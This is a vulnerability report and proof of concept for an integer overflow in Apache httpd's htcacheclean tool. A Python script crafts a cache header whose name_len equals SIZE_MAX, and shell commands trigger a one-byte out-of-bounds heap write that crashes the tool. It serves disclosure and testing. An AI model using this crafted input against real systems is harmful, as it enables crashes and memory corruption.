# 032 - htcacheclean unchecked cache name length allocation

`support/htcacheclean.c:458` reads `disk_info.name_len` from a header file
and uses it as both an allocation size and an indexed write offset, with no
overflow guard.

## Setup

No httpd runtime is required. The bug is in the standalone `htcacheclean`
support binary. Build the source tree and create a fake cache directory
containing a crafted `.header` file.

```bash
mkdir -p /tmp/cachepoc/aa/bb
```

The cache header layout begins with a `disk_cache_info_t` structure whose
first field is `format` (must equal `DISK_FORMAT_VERSION`, value `5`), and
later contains `name_len` as an `apr_size_t`. The exact field offsets
depend on the build, but `htcacheclean` itself reads
`sizeof(disk_cache_info_t)` bytes from offset 0, then assigns
`disk_info.name_len` to a local `apr_size_t`.

A minimal crafted file fixes `format=5` and `name_len=APR_SIZE_MAX`. Use
Python so we don't have to hand-pack platform integers.

## Trigger

```python
# /tmp/cachepoc/build_header.py
import struct, ctypes, os

SIZE_T = ctypes.sizeof(ctypes.c_size_t)
fmt_long = "Q" if SIZE_T == 8 else "I"

# Layout from mod_cache_disk's disk_cache_info_t (open-coded; padding
# matches the build). Fill with zeros, then place format=5 at offset 0
# and name_len=SIZE_MAX at the offset used in this build.
buf = bytearray(4096)
struct.pack_into("I", buf, 0, 5)               # format
SIZE_MAX = (1 << (SIZE_T * 8)) - 1
# name_len is the last apr_size_t in disk_cache_info_t for this build;
# inspect with: pahole .libs/htcacheclean | grep name_len
name_len_off = int(os.environ.get("NAME_LEN_OFF", "120"))
struct.pack_into(fmt_long, buf, name_len_off, SIZE_MAX)

with open("/tmp/cachepoc/aa/bb/poc.header", "wb") as f:
    f.write(bytes(buf))
```

```bash
python3 /tmp/cachepoc/build_header.py
./support/htcacheclean -a -p /tmp/cachepoc -v
```

Run under a sanitizer build for a clean signal:

```bash
CFLAGS="-fsanitize=address,undefined -g" ./configure
make -C support htcacheclean
./support/htcacheclean -a -p /tmp/cachepoc -v
```

## Observed effect

`apr_palloc(p, len + 1)` requests `0` bytes (wrap of `SIZE_MAX + 1`).
The subsequent `url[len] = 0` writes a NUL at offset `SIZE_MAX`, far
outside the returned allocation. Under ASan this is reported as
`heap-buffer-overflow WRITE of size 1`. Without a sanitizer, the
process either crashes immediately on the wild write or corrupts
the pool free list and crashes shortly after.

The `-A` (extended listing) variant reproduces the same write because
the out-of-bounds store is on the unconditional path before the
extended branch.
